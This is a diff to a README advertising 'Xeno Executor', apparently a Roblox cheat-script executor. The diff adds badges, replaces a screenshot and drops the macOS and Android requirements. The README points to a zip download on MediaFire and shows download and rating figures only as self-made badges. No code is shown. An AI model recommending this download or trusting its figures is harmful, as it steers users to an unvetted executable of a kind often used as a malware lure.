@@ -3,10 +3,14 @@
 ![Downloads](https://img.shields.io/badge/Downloads-750K%2B-brightgreen)
 ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-yellow)
 ![Latest Version](https://img.shields.io/badge/Version-1.3.30-blue)
+![Status](https://img.shields.io/badge/Status-Active-success)
+![Platform](https://img.shields.io/badge/Platform-Windows-0078D6)
+![Compatibility](https://img.shields.io/badge/Compatibility-Windows%2010%2F11-informational)
 
 ## [⬇️ Download Xeno Executor — Latest Version](https://www.mediafire.com/file/4wkcs25mguiycil/Xeno_Executor.zip/file)
 
-<img width="1006" height="555" alt="{A3D951AD-5921-4BE1-B701-B35C5C4404C9}" src="https://github.com/user-attachments/assets/431bdf7d-7620-4612-98f1-22930527db8c" />
+<img width="1721" height="914" alt="xenoooo" src="https://github.com/user-attachments/assets/3845c4d4-4aed-43d3-bb6e-35df0c0b5940" />
+
 
 
 ---
@@ -119,26 +123,6 @@ Using **xeno executor roblox** as your primary script tool delivers tangible imp
 - **Storage:** 500 MB free space
 - **GPU:** DirectX 11 compatible
 
-### macOS
-
-**Minimum:**
-- **OS:** macOS 11 (Big Sur)
-- **CPU:** Intel Core i5 / Apple M1 or later
-- **RAM:** 4 GB
-- **Storage:** 200 MB free space
-- **Internet:** Required for injection and auto-updates
-
-**Recommended:**
-- **OS:** macOS 13 (Ventura) or later
-- **CPU:** Apple M1/M2/M3 or Intel Core i7
-- **RAM:** 8 GB
-
-### Android
-
-- **OS:** Android 8.0 (Oreo) or later
-- **RAM:** 3 GB minimum
-- **Storage:** 150 MB free space
-- **Internet:** Stable Wi-Fi recommended
 
 ---
 
